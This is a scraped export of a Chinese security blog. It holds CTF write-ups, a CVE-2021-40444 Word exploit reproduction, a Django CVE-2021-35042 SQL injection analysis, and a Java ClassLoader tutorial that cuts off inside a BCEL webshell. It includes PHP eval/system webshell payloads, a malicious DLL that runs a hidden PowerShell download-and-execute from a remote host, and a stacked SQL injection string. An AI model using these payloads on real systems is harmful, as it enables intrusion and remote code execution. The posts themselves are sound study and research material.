不过这个flag应该是有问题的，并不能验证成功。 buuctf_2018_online_tool&lt;?phpif (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) { $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];}if(!isset($_GET[&#39;host&#39;])) { highlight_file(__FILE__);} else { $host = $_GET[&#39;host&#39;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&#34;glzjin&#34;. $_SERVER[&#39;REMOTE_ADDR&#39;]); echo &#39;you are in sandbox &#39;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;.$host);} 打开首页，又是一段代码，其中涉及两个函数escapeshellarg和escapeshellcmd，这是个防止命令执行的函数，区别在于 escapeshellarg：转义其中的单引号，并用单引号来包裹字符串。保证输入为一个字符串。 escapeshellcmd：转义可能导致命令执行的特殊符号，常见的特殊符号包括换行符都被会转义，单双引号在不配对的时候也被转义。保证输入为避免利用shell的特性执行其他命令。 本身正常情况下，都能起到防止命令注入，但是如果在一起使用，就会导致异常转义，因为escapeshellcmd也转义反斜线。 127.0.0.1&#39; idescapeshellarg: &#39;127.0.0.1&#39;\\&#39;&#39; id&#39;escapeshellcmd: 127.0.0.1\\&#39; id 在一起使用就会变成 escapeshellarg+escapeshellcmd: &#39;127.0.0.1&#39;\\\\&#39;&#39; id\\&#39; 简化上面的输入就是，第一个单引号已经被转义，后面的单引号也是，所以此处只当作字符来处理。 127.0.0.1\\ id&#39; 但以上的命令并不能被执行，问题在于利用shell特性的分割连接符等都被转义了。以上解决的只是把一个字符串的输入分割成了携带参数形式的输入。 后面需要利用nmap，既然是能分割成携带参数选项的输入，那需要配合nmap的参数来执行。记得在nmap的一个低版本存在一个提权问题，不过由于是交互界面。也不能使用shell的命令符号，需要查找一个nmap能执行使用的参数。 首页代码中使用IP创建一个sandbox的目录，按照惯性，应该是为了写文件而准备的，所以应该是利用nmap的输出属性来执行。nmap输出参数有-oN/-oX/-oS/-oG/-oA。 首先需要调试一个能正常逃逸出单引号的payload，可以在https://tool.lu/coderunner测试，首先需要逃逸出双引号的两端包裹，先在两端添加两个单引号，输出为： &#39;&#39;\\\\&#39;&#39;\\&lt;\\?php @eval\\(\\$_POST\\[123\\]\\)\\;\\?\\&gt; -o index.php&#39;\\\\&#39;&#39;&#39;简化为：\\&lt;?php @eval($_POST[123]);?&gt; -o index.php\\\\ 再需要分割开两端的反斜线，两端添加两个空格。 &#39; &lt;?php @eval($_POST[123]);?&gt; -o index.php &#39;输出为：&#39;&#39;\\\\&#39;&#39; \\&lt;\\?php @eval\\(\\$_POST\\[123\\]\\)\\;\\?\\&gt; -o index.php &#39;\\\\&#39;&#39;&#39; 于是大概能用的payload就出来了，先测试一下哪个参数可以使用，一个个试一下，发现oG可以使用。 最后剑来，在根目录下发现一个flag 哎嘿，这个flag又报错，看来0Solves的多少有点问题。 Bestphp首页又是一段PHP &lt;?php highlight_file(__FILE__); error_reporting(0); ini_set(&#39;open_basedir&#39;, &#39;/var/www/html:/tmp&#39;); $file = &#39;function.php&#39;; $func = isset($_GET[&#39;function&#39;])?$_GET[&#39;function&#39;]:&#39;filters&#39;; call_user_func($func,$_GET); include($file); session_start(); $_SESSION[&#39;name&#39;] = $_POST[&#39;name&#39;]; if($_SESSION[&#39;name&#39;]==&#39;admin&#39;){ header(&#39;location:admin.php&#39;); }?&gt; 由于存在call_user_func，所以我们可以覆盖file参数，来达到包含我们想要的文件，如果直接读取flag的话，下面的内容就有点多余，所以这里大概需要读取function和admin文件来查看。不能直接包含，不然PHP代码看不到。 /?function=extract&amp;file=php://filter/convert.base64-encode/resource=./function.php function内容为如下，看起来是个黑名单过滤。 &lt;?phpfunction filters($data){ foreach($data as $key=&gt;$value){ if(preg_match(&#39;/eval|assert|exec|passthru|glob|system|popen/i&#39;,$value)){ die(&#39;Do not hack me!&#39;); } }}?&gt; admin文件为 &lt;?phpif(empty($_SESSION[&#39;name&#39;])){ session_start(); #echo &#39;hello &#39; + $_SESSION[&#39;name&#39;];}else{ die(&#39;you must login with admin&#39;);}Pz4 看起来没有直接利用的函数，但是这个创建了session，也就是有session文件的写入，我们需要去读取session文件来包含。 session的name在首页的POST中传输，再去访问admin文件，这里只判断参数是不是空。 /?function=extract&amp;file=php://filter/convert.base64-encode/resource=/tmp/sess_k8ud00tfqs2mevh289uukn5to5 加载发现，并没有回显，也许不在这个目录，在/var/lib下。 但是这里有一个问题，由于open_basedir的存在，我们不能加载别的目录下的文件，只能加载当前目录和tmp目录。 session_start函数有一个参数为save_path，可以设置保存路径，注意此处随便写入一个session的文件名，不然在POST获取的时候，就已经创建null。 POST /?function=session_start&amp;save_path=/tmp HTTP/1.1Host: www.bmzclub.cn:22937DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: PHPSESSID=123Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 23name=&lt;?php phpinfo();?&gt; 获取session /?function=extract&amp;file=/tmp/sess_123 写入一个shell name=&lt;?php system($_GET[&#34;aaa&#34;]);?&gt;","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"Office Word CVE-2021-40444 ","slug":"Office-Word-CVE-2021-40444","date":"2021-09-15T08:55:33.000Z","updated":"2021-09-15T08:55:33.305Z","comments":true,"path":"2021/09/Office-Word-CVE-2021-40444/","link":"","permalink":"https://misakikata.github.io/2021/09/Office-Word-CVE-2021-40444/","excerpt":"","text":"CVE-2021-40444Office Word的一个1day，首先来复现一下使用，如果直接运行会显示CAB file建立时出错，需要先安装lacb。这里使用Tools老哥的一个方法，直接安装： wget http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;l&#x2F;lcab&#x2F;lcab_1.0b12.orig.tar.gz tar zxvf lcab_1.0b12.orig.tar.gz cd lcab-1.0b12 .&#x2F;configure make sudo make install which lcab 使用项目地址：https://github.com/lockedbyte/CVE-2021-40444 利用文档中给出的方法执行： python3 exploit.py generate test&#x2F;calc.dll http:&#x2F;&#x2F;192.168.111.130:5555 然后监听 python3 exploit.py host 5555 把在out文件夹下生成的document.docx拷贝到Windows下，此处的office2019，16.0.13929版本。运行docx文件，可以看到交互过程 于是就可以弹出计算器 从请求上看，有一个word.html文件，在srv目录下。打开查看,OK 看不懂。。。看样子是做了混淆？不过任然可以依稀看到ActiveXObject，这个大概跟利用ActiveX控件有关。 可以来美化一下，虽然依旧看不懂就是。不过从中间大概可以看到几个关键点，XMLHttpRequest发起的请求，地址为http://192.168.111.130:5555/word.cab。所以这个cab文件才是真正执行的文件？ 利用7z打开这个cab文件，文件标头为4D 53 43 46，虽然这个文件只有224K，但是里面有一个名为msword.inf的文件，大小为1G左右。这不太对。这个文件也在上面的js中提到过，所以大概是需要解压出来，想办法提取一下这个文件。 该文件是Windows的压缩格式，一般是作为安装包文件。利用Kali下的cabextract来解压。没有的话直接安装就行。 cabextract --list word.cab 执行报错，这个文件不能正常解压提取，说明不是一个正经的cab文件。看一下python的处理代码 可以发现其实msword.inf就是word.dll。这个dll文件就是一开始传入的calc.dll重命名来的。后面用lcab来生成cab文件，然后用函数patch_cab来处理这个cab文件。这么我们先把这个处理前生成的cab文件保存一下。 execute_cmd(&#39;lcab out.cab out2.cab&#39;) 获取到out2.cab，这个文件可以正常解压查看，所以我们先尝试是否能自己生成一个cab文件，利用dll来转换。 用cobaltstrike生成一个DLL文件，按照转换方式来处理一下。先改个名字，此处用的beacon作为名字，那么word.html中也要做相应的修改。或者把名字改为msword。 然后需要patch一下，原项目中存在patch脚本，修改为类似如下： #!&#x2F;usr&#x2F;bin&#x2F;env python3 ​ # Patch cab file ​ m_off &#x3D; 0x2d f &#x3D; open(&#39;.&#x2F;beacon.cab&#39;,&#39;rb&#39;) cab_data &#x3D; f.read() f.close() ​ out_cab_data &#x3D; cab_data[:m_off] out_cab_data +&#x3D; b&#39;\\x00\\x5c\\x41\\x00&#39; out_cab_data +&#x3D; cab_data[m_off+4:] ​ out_cab_data &#x3D; out_cab_data.replace(b&#39;..\\\\beacon.inf&#39;, b&#39;..&#x2F;beacon.inf&#39;) ​ f &#x3D; open(&#39;.&#x2F;beacon2.cab&#39;,&#39;wb&#39;) f.write(out_cab_data) f.close() 但是在执行过程中并没有上线，不确定原因，可能是DLL的问题？CS生成的DLL不能直接拿来用？ 使用C代码编译生成一个DLL，利用如下代码，编译执行即可。 #include &lt;windows.h&gt; ​ void exec(void) &#123; system(&quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.111.130:80&#x2F;a&#39;))\\&quot;&quot;); return; &#125; ​ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) &#123; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH: exec(); break; ​ case DLL_THREAD_ATTACH: break; ​ case DLL_THREAD_DETACH: break; ​ case DLL_PROCESS_DETACH: break; &#125; return TRUE; &#125; 编译 apt-get install gcc-mingw-w64 i686-w64-mingw32-gcc -shared beacon.c -o beacon.dll 把文件放到test目录下，执行上面的命令。 减轻影响 这个是利用ActiveX控件来执行的，而这个控件只有IE支持，到IE的选项-安全中，自定义安全级别，在运行ActiveX控件和插件选项中选择禁用。 参考地址： https://github.com/lockedbyte/CVE-2021-40444 https://www.t00ls.cc/thread-62682-1-1.html https://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"CVE-2021-35042 Django SQL注入","slug":"CVE-2021-35042-Django-SQL注入","date":"2021-08-06T08:16:55.000Z","updated":"2021-08-06T08:19:06.431Z","comments":true,"path":"2021/08/CVE-2021-35042-Django-SQL注入/","link":"","permalink":"https://misakikata.github.io/2021/08/CVE-2021-35042-Django-SQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"CVE-2021-35042 Django SQL注入该漏洞是由于对QuerySet.order_by()中用户提供数据的过滤不足，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行SQL注入攻击，最终造成服务器敏感信息泄露。 先本地创建一个Django环境，使用的版本为Django 3.1.10。具体的示例代码就使用：https://github.com/YouGina/CVE-2021-35042。 Order_by参数获取其中获取GET参数值的是request.GET.get(&#39;order_by&#39;, &#39;name&#39;)这么一段，从order_by 中获取值，缺省为name。这个name的意思是数据库的字段。在models.py文件中有定义，也就是其实获取的是需要去查询的数据库字段名。 class User(models.Model): name &#x3D; models.CharField(max_length&#x3D;200) ​ def __str__(self): return self.name order_by这个参数的作用的排序，对一个列或者多个值进行升序或者降序的排列。比如： SELECT * FROM Websites ORDER BY alexa DESC; 上面这个SQL的意思就是，按照按照Alexa的顺序降序排列，DESC为降序，ASC为升序。 此问题按照官方的说法是：绕过标记为弃用的路径中的预期列引用验证。 流程分析在这里我们先输入一个不存在的字段名name4，查看一下是怎样一个流程。首先进入如下函数，判断order_by 的排序顺序和表达式。 def add_ordering(self, *ordering): &quot;&quot;&quot; Add items from the &#39;ordering&#39; sequence to the query&#39;s &quot;order by&quot; clause. These items are either field names (not column names) -- possibly with a direction prefix (&#39;-&#39; or &#39;?&#39;) -- or OrderBy expressions. ​ If &#39;ordering&#39; is empty, clear all ordering from the query. &quot;&quot;&quot; errors &#x3D; [] for item in ordering: if isinstance(item, str): if &#39;.&#39; in item: warnings.warn( &#39;Passing column raw column aliases to order_by() is &#39; &#39;deprecated. Wrap %r in a RawSQL expression before &#39; &#39;passing it to order_by().&#39; % item, category&#x3D;RemovedInDjango40Warning, stacklevel&#x3D;3, ) continue if item &#x3D;&#x3D; &#39;?&#39;: continue if item.startswith(&#39;-&#39;): item &#x3D; item[1:] if item in self.annotations: continue if self.extra and item in self.extra: continue # names_to_path() validates the lookup. A descriptive # FieldError will be raise if it&#39;s not. self.names_to_path(item.split(LOOKUP_SEP), self.model._meta) elif not hasattr(item, &#39;resolve_expression&#39;): errors.append(item) if getattr(item, &#39;contains_aggregate&#39;, False): raise FieldError( &#39;Using an aggregate in order_by() without also including &#39; &#39;it in annotate() is not allowed: %s&#39; % item ) if errors: raise FieldError(&#39;Invalid order_by arguments: %s&#39; % errors) if ordering: self.order_by +&#x3D; ordering else: self.default_ordering &#x3D; False 函数走到names_to_path的时候会根据传入的参数生成一个PathInfo 元组。返回最终的字段和没有找到的字段。其中opts代表模型选项，这里代表的这个表。然后去获取传入的字段值。当最后找不到这个字段的时候，会报一个Cannot resolve keyword &#39;%s&#39; into field的错误，也就是我们最后会看到的错误。 def names_to_path(self, names, opts, allow_many&#x3D;True, fail_on_missing&#x3D;False): path, names_with_path &#x3D; [], [] for pos, name in enumerate(names): cur_names_with_path &#x3D; (name, []) if name &#x3D;&#x3D; &#39;pk&#39;: name &#x3D; opts.pk.name ​ field &#x3D; None filtered_relation &#x3D; None try: field &#x3D; opts.get_field(name) except FieldDoesNotExist: if name in self.annotation_select: field &#x3D; self.annotation_select[name].output_field elif name in self._filtered_relations and pos &#x3D;&#x3D; 0: filtered_relation &#x3D; self._filtered_relations[name] field &#x3D; opts.get_field(filtered_relation.relation_name) if field is not None: # Fields that contain one-to-many relations with a generic # model (like a GenericForeignKey) cannot generate reverse # relations and therefore cannot be used for reverse querying. if field.is_relation and not field.related_model: raise FieldError( &quot;Field %r does not generate an automatic reverse &quot; &quot;relation and therefore cannot be used for reverse &quot; &quot;querying. If it is a GenericForeignKey, consider &quot; &quot;adding a GenericRelation.&quot; % name ) try: model &#x3D; field.model._meta.concrete_model except AttributeError: # QuerySet.annotate() may introduce fields that aren&#39;t # attached to a model. model &#x3D; None else: # We didn&#39;t find the current field, so move position back # one step. pos -&#x3D; 1 if pos &#x3D;&#x3D; -1 or fail_on_missing: available &#x3D; sorted([ *get_field_names_from_opts(opts), *self.annotation_select, *self._filtered_relations, ]) raise FieldError(&quot;Cannot resolve keyword &#39;%s&#39; into field. &quot; &quot;Choices are: %s&quot; % (name, &quot;, &quot;.join(available))) break get_field函数的意思是返回一个字段名称的字段实例。对应的表内字段名和字段实例的字典类型。其中_forward_fields_map和fields_map的作用是相同的，就是后者还会检查一些内部的其他字段。 def get_field(self, field_name): &quot;&quot;&quot; Return a field instance given the name of a forward or reverse field. &quot;&quot;&quot; try: # In order to avoid premature loading of the relation tree # (expensive) we prefer checking if the field is a forward field. return self._forward_fields_map[field_name] except KeyError: # If the app registry is not ready, reverse fields are # unavailable, therefore we throw a FieldDoesNotExist exception. if not self.apps.models_ready: raise FieldDoesNotExist( &quot;%s has no field named &#39;%s&#39;. The app cache isn&#39;t ready yet, &quot; &quot;so if this is an auto-created related field, it won&#39;t &quot; &quot;be available yet.&quot; % (self.object_name, field_name) ) ​ try: # Retrieve field instance by name from cached or just-computed # field map. return self.fields_map[field_name] except KeyError: raise FieldDoesNotExist(&quot;%s has no field named &#39;%s&#39;&quot; % (self.object_name, field_name)) 最后都不存在的情况下会告知，User has no field named name4。 当然如果是存在的字段，比如name，程序从get_field获取到的field就是cve_orderby.User.name。也就是不管传入的参数是否正常，只要走了names_to_path最后都会返回不存在字段或者存在的字段实例对象，而不是拼接SQL去执行，那么至少在这里就不能造成SQL注入了。整个执行的代码都为：SELECT &quot;cve_orderby_user&quot;.&quot;id&quot;, &quot;cve_orderby_user&quot;.&quot;name&quot; FROM &quot;cve_orderby_user&quot;。 在查了一堆资料发现这个问题其实是绕过names_to_path这个判断，在函数add_ordering中，主要有五个判断： 字段中是否带点，带的话提示传入的是原始列的别名，并警告不建议这么使用。 字段是否为问号。 字段开头是否为短横杠。 判断是否在一个map字典里，暂时也不知道是干啥的。 判断是否有额外的参数信息。 所以，此处我们传一个带点的参数，比如name.name。到add_ordering中的时候，走到这个函数上，由于存在continue的作用，将跳过后续的判断，也就是不在进行names_to_path，无法获取字段的实例对象。 后续进入_fetch_all的时候就已经生成SQL：SELECT &quot;cve_orderby_user&quot;.&quot;id&quot;, &quot;cve_orderby_user&quot;.&quot;name&quot; FROM &quot;cve_orderby_user&quot; ORDER BY (&quot;name&quot;.name) ASC。也就是把参数name.name拼接进去。 于是构造一条语句，注意这里使用的是MySQL数据库。构造：SELECT cve_orderby_user.id, cve_orderby_user.name FROM cve_orderby_user ORDER BY (cve_orderby_user.name);select updatexml(1,concat(0x7e,(select @@version)),1);#) ASC 只需要传输参数：cve_orderby_user.name);select updatexml(1,concat(0x7e,(select @@version)),1);#","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"小程序博客上线","slug":"小程序博客上线","date":"2021-08-06T08:15:10.000Z","updated":"2021-08-06T08:16:03.773Z","comments":true,"path":"2021/08/小程序博客上线/","link":"","permalink":"https://misakikata.github.io/2021/08/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8D%9A%E5%AE%A2%E4%B8%8A%E7%BA%BF/","excerpt":"","text":"闲来无事做了一个小程序端的博客，利用的Halo做后端，腾讯云托管。有兴趣的朋友可以关注一下。博客名：misaki blog物料码：","categories":[],"tags":[]},{"title":"ClassLoader","slug":"ClassLoader","date":"2021-07-30T10:45:52.000Z","updated":"2021-07-30T10:45:52.985Z","comments":true,"path":"2021/07/ClassLoader/","link":"","permalink":"https://misakikata.github.io/2021/07/ClassLoader/","excerpt":"","text":"一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是Bootstrap ClassLoader(引导类加载器)、Extension ClassLoader(扩展类加载器)、App ClassLoader(系统类加载器)，AppClassLoader是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用AppClassLoader加载类，ClassLoader.getSystemClassLoader()返回的系统类加载器也是AppClassLoader。 我们在尝试获取被Bootstrap ClassLoader类加载器所加载的类的ClassLoader时候都会返回null。 ClassLoader类有如下核心方法： loadClass(加载指定的Java类) findClass(查找指定的Java类) findLoadedClass(查找JVM已经加载过的类) defineClass(定义一个Java类) resolveClass(链接指定的Java类) Java类动态加载方式静态加载 Office.java class Office&#123; public static void main(String[] args)&#123; if(args[0].equals(&quot;Word&quot;))&#123; Word w &#x3D; new Word(); w.start(); &#125; if(args[0].equals(&quot;Excel&quot;))&#123; Excel e &#x3D; new Excel(); e.start(); &#125; &#125; Word.java class Word&#123; public void start()&#123; System.out.println(&quot;Word Start&quot;); &#125; 编译会报错，这当然没问题，因为确实没有写Excel.java类。如果修改为动态加载，动态加载类是按需加载的，你需要什么类，就加载什么类，一个类的状态，不会影响到另一个类的使用。 所以我们可以将Office类改造如下： class Office&#123; public static void main(String[] args)&#123; try&#123; Class c &#x3D; Class.forName(args[0]); Word w &#x3D; (Word)c.newInstance(); w.start(); &#125; catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; 虽然我们还是没有写Excel类，但此时我们再编译Office.java文件，编译通过；成功按照我们预想的结果运行，这样Word类就可以单独运行。 常用的类动态加载方式&#x2F;&#x2F; 反射加载TestHelloWorld示例 Class.forName(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;); ​ &#x2F;&#x2F; ClassLoader加载TestHelloWorld示例 this.getClass().getClassLoader().loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;); Class.forName(“类名”)默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用Class.forName(“类名”, 是否初始化类, 类加载器)，而ClassLoader.loadClass默认不会初始化类方法。 Class加载器调用顺序加载class文件分为三个阶段： 第一阶段找到class文件并将或者文件包含的字节码加载到内存，至于如何找到class文件就是通过findClass()方法定义的，找到之后通过defineClass()方法来创建类对象 第二阶段分为三个步骤（验证，准备，解析）：字节码验证，Class类数据结构分析以及相应的内存分配，符号表链接 第三个阶段将类中的静态属性和初始化赋值，以及静态代码块的执行 加载器顺序： public class Test &#123; public static void main(String[] args) &#123; ClassLoader classLoader &#x3D; Test.class.getClassLoader(); System.out.println(classLoader); ClassLoader classLoader1 &#x3D; classLoader.getParent(); System.out.println(classLoader1); ClassLoader classLoader2 &#x3D; classLoader1.getParent(); System.out.println(classLoader2); &#125; &#125; 能得到这么一个结果： sun.misc.Launcher$AppClassLoader@18b4aac2 sun.misc.Launcher$ExtClassLoader@677327b6 null 第一次调用的时候得到的是AppClassLoader，应用程序加载器，在没有明确指定的时候就是默认加载应用程序内类库加载器。 第二次调用的时候得到的是ExtClassLoader。扩展类加载器，是AppClassLoader加载器的父类加载器，至于null是bootstrap加载器的返回，这个加载器没有明确的引用。 双亲委派Bootstrap Class Loader 这个类加载器负责加载存放在&lt;JAVA_HOME&gt;\\lib目录，或者被-Xbootclasspath参数所指定的路径中存放的，而且是Java虚拟机能够识别的(按照文件名识别，如rt.jar、tools.jar，名字不符合的类库即使放在lib目录中也不会被加载)类库加载到虚拟机的内存中。 Extension Class Loader 它负责加载&lt;JAVA_HOM E&gt;\\lib\\ext目录中，或者被java.ext.dirs系统变量所 指定的路径中所有的类库。注意，扩展类加载器加载的必须是jar或者zip文件，不能是.class文件。 App Class Loader 这个类加载器由sun.misc.Launcher$AppClassLoader来实现。由于应用程序类加载器是ClassLoader类中的getSystemClassLoader()方法的返回值，所以也称它为“系统类加载器”。它负责加载用户类路径(ClassPath)上所有的类库，开发者同样可以直接在代码中使用这个类加载器 双亲委派工作原理：类加载器接收加载类的请求后，并不会自己去主动加载类，而是委派给父类加载器来加载，只要在父类加载器无法加载后才由子类加载器加载。也就是所有的加载请求都会反馈给最顶层的加载器中。加载器的子父类关系 双亲委派模型的好处就是同一个名称的类只能在一个类加载器中加载一次，避免多次加载导致混乱。 破坏双亲委派如果双亲委派是父类加载器来搜索加载，那自然在某些环境下并不希望由父类来加载，所以这时候就需要重写loadClass方法来破坏双亲委派的加载逻辑。ClassLoader默认构造方法设置了父类加载器为系统加载器，loadClass方法实现了委托模型，我们只需要重写findClass方法实现自己的类加载逻辑，比如javadoc给的一个例子： protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; byte[] b &#x3D; loadClassData(name); return defineClass(name, b, 0, b.length); &#125; private byte[] loadClassData(String name) &#123; &#x2F;&#x2F; load the class data from the file or network &#125; 实现大体上分为两步，第一步获取字节码的字节数组byte[]，然后通过ClassLoader提供的defineClass方法将字节码定义成Class对象。但是以上这种重写的方式并不破坏双亲委派机制，只是自定义类加载器，在双亲委派的基础上，实现自己需要的部分方法，后续还是采用重写loadClass的方式。 先来看一下loadClass的源代码实现： protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; synchronized (getClassLoadingLock(name)) &#123; &#x2F;&#x2F; First, check if the class has already been loaded Class&lt;?&gt; c &#x3D; findLoadedClass(name); if (c &#x3D;&#x3D; null) &#123; long t0 &#x3D; System.nanoTime(); try &#123; if (parent !&#x3D; null) &#123; c &#x3D; parent.loadClass(name, false); &#125; else &#123; c &#x3D; findBootstrapClassOrNull(name); &#125; &#125; catch (ClassNotFoundException e) &#123; &#x2F;&#x2F; ClassNotFoundException thrown if class not found &#x2F;&#x2F; from the non-null parent class loader &#125; ​ if (c &#x3D;&#x3D; null) &#123; &#x2F;&#x2F; If still not found, then invoke findClass in order &#x2F;&#x2F; to find the class. long t1 &#x3D; System.nanoTime(); c &#x3D; findClass(name); ​ &#x2F;&#x2F; this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); &#125; &#125; if (resolve) &#123; resolveClass(c); &#125; return c; &#125; &#125; ​ 先判断jvm是否已经加载了，没有的话判断是否还有父类，有的话去父类加载，没有的话说明是最顶层的类，直接在BootstraploadClass中查找加载，如果依然没有，则返回null，到最后由当前子类加载器加载。 想破坏委派需要不让他去父类加载，或者我们自定义父类加载的流程。例如： public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; Class&lt;?&gt; c &#x3D; findLoadedClass(name); if (c !&#x3D; null) &#123; return c; &#125; Class&lt;?&gt; classname &#x3D; null; try &#123; classname &#x3D; findClass(name); &#125; catch (Exception e) &#123;&#125; if (classname !&#x3D; null) &#123; &#x2F;&#x2F;.... return findClass; &#125; return super.loadClass(name); &#125; 以上是一个简单的重写，意思就是jvm如果找不到当前类，则调用findclass来加载此类。也就是去掉了到父类中查找加载的步骤而已。 加载器加载shell这种利用classload的来加载恶意代码从而实现webshell的方式，已经有很多实现了，比如： https://github.com/threedr3am/JSP-Webshells/blob/master/jsp/1/1.jsp 就是利用加载器来加载字节码实现webshell，还有冰蝎shell，同样是加载器实现。使用上面这个1.jsp来分析一下，当我们了解加载器后再看这个shell就简单一些 &lt;%@ page import&#x3D;&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;h2&gt;BCEL字节码的JSP Webshell&lt;&#x2F;h2&gt; &lt;% String bcelCode &#x3D; &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85U$5bW$hU$U$fe$86$ML$Y$86B$93R$$Z$bcQ$hn$j$ad$b7Z$w$da$mT4$5c$84$W$a4x$9bL$Oa$e8d$sN$s$I$de$aa$fe$86$fe$87$beZ$97$86$$q$f9$e8$83$8f$fe$M$7f$83$cb$fa$9dI$I$89$84$e5$ca$ca$3es$f6$de$b3$f7$b7$bf$bd$cf$99$3f$fe$f9$e57$A$_$e3$7b$jC$98$d6$f0$a6$8e6$b9$be$a5$e1$86$8e4f$a4x$5b$c7$y$e6t$b4$e3$a6$O$V$efH1$_$j$df$8d$e3$3d$b9f$3a$d1$8b$F$N$8b$3a$96$b0$i$c7$fb$3aV$b0$aa$e3$WnK$b1$a6c$j$ltb$Dw$e2$d8$d4$f1$n$3e$d2$f0$b1$82X$mJ$K$S$99$jk$d72$5d$cb$cb$9b$aba$e0x$f9$v$F$j$d7$j$cf$J$a7$V$f4$a5N$9aG$d7$U$a83$7eN$u$e8$c98$9eX$y$X$b2$o$b8ee$5d$n$c3$f9$b6$e5$aeY$81$p$f75$a5$gn$3bL$a5g$d2$b6pgw$j$97$vbv$n$a7$a0$bb$U$c5L$97$j7$t$C$F$83$t$d2$d5L$7c$e3L$b6$bc$b5$r$C$91$5b$RV$e4$3cPuv$7c3$ddd$a1$af$ea$S$Y$c3$af$86$96$7dw$c1$wF$40$c8$90$86O$c82$J$s$9a$d9$3d$5b$UC$c7$f7J$g$3eU$Q$P$fdjF$F$e7R$a3$adXQ$L$96$e3$v8$9f$da$3c$85$U$x$c8$b3$ccd$L$b3$82$$$c7$x$96Cn$85U$m$afu$e8$f3$c7jz$b5g$f7C$d9$95$b6$cd4$e3$d9$R$c9$fa$aa_$Ol1$e7H$w$bb$8f$u$bc$y$D$Y$b8$AKA$ff$v$a4$Rkk$86Ht$8b$fcU$9b$86$ac$B$h9$D$C$5b$g$f2$G$b6$e1$c8D$3bR$dc5$e0$e2$8a$81$C$c8$84$a2$hxQ$ee$9e$c0$93$q$f0$I$9a$G$df$40$R$9f$b1eu$b4$b6k$95$c8s$60$a0$84PC$d9$c0$$$3e7$b0$87$7d$N_$Y$f8$S_i$f8$da$c07$b8$c7$40$p$p$e9$99$d9$cc$c8$88$86o$N$7c$87a$F$bd$c7$V$$ew$84$j6$a9$8e$fa$96$ac$X$b5To$$$t$z$r$9bs$f6$d8$7d$a5$ec$85NA2$9b$Xa$7d$d3$d7$d4$f4$9aZv$5d$ec$J$5b$c1$a5V$t$a1A$b5$i$f8$b6$u$95$a6$9a2$d5$94$q$82$99$e6$h$H$a0$ff$u$db$89$R$YH$b54$c8$g$92$c7$a6$da$a4Km$9c$f6$5c$s$9a$f7$O$abX$U$k$cf$d5$e4$ff$a0$fd$ef$d9$ea96$cd$c8NU$RG$8f$Z$bf61M$fc4$98$f8z_K$D$BK$82E$v$9a$df$h$a5$a3$daGO$Hw$82$8dd$L$b5$82N$w$j$b7z$b9$b0$bd$f3$ec$92$q$81$e7$t$b5$99$96$db$x$b6_0Ke$cf$f4$83$bci$V$z$7b$5b$98Y$ce$a2$e9x$a1$I$3c$cb5$a3$81$dc$e2$992o$87$8e$eb$84$fbdOx$d5$T$d7$cf$uwZ$5e$B$8dC$b7_$K$F$b1$c4$fcr$d8x$a0$97$e9$da$C$7f$83Z$81V$94$3b$d7$c33$bc$b9$87$f8$JP$f8$e7$n$a2$8c$f1$f9$C$86y$ad$3f$c5$dd$9f$e8$e0$bd$P$dc$i$3b$80r$88$b6$8d$D$c4$W$O$a1n$i$a2$7d$e3$R$3a$c6$x$d0$w$88$l$a0$f3$A$fa$e2d$F$5d$h$d7$d4$df$91$98$YT$x0$S$dd$U$eb$P$k$ff56Q$c1$99$9f$d1$f30J$f04$e504$ca$$$7eJ$M$fe$baq$R$3d0$Jf$g$J$cc$nI$60$f2$bb$U$a5$c6$b3x$O$88$9eF$IQ$a1$ff$U$fd$9f$t$c4$8b$b4$5dB$8a1$t$I$7f$94V$VcQ$vm$8fiT5$8ck$98$d00$a9$e12$f07$G$b8c$g$d0M$c1$L$fc$f3$f6$a0$94$95$9a$5c$r$L$edc$3f$a1$e7$H$